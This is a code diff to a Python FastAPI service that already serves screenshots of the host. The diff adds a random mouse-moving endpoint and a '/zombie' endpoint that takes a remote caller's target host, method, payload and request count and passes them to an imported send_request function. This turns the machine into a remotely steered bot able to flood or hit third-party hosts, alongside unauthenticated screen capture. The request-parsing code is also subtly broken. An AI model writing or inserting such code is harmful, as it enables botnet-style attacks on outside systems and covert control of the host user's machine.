@@ -12,6 +12,8 @@ import tkinter as tk
 import os
 import pyautogui
 from fastapi.responses import FileResponse
+from zombie import send_request
+import random
 
 # --- Asset paths ---
 ASSETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
@@ -83,7 +85,7 @@ def startup_event():
 
 @app.get('/status')
 def status_check():
-    return {"status": "online"}
+    return {"status": "Online"}
 
 @app.get("/os")
 def read_os():
@@ -137,3 +139,25 @@ def screenshot():
     image = pyautogui.screenshot()
     image.save(screenshot_path)
     return FileResponse(screenshot_path, media_type='image/png')
+
+@app.get('/move-cursor')
+def move_cursor():
+    screen_width, screen_height = pyautogui.size()
+    x = random.randint(0, screen_width - 1)
+    y = random.randint(0, screen_height - 1)
+    pyautogui.moveTo(x, y)
+    return {"status": "moved", "x": x, "y": y}
+
+@app.post('/zombie')
+def zombie_endpoint(request: Request):
+    data = request.json() if hasattr(request, 'json') else {}
+    host = data.get('host')
+    method = data.get('method', 'GET')
+    content = data.get('content', {})
+    quantity = data.get('quantity', 1)
+    try:
+        result = send_request(host, method, content, quantity)
+        return {"status": "ok", "result": str(result)}
+    except Exception as e:
+        return {"status": "error", "error": str(e)}
+
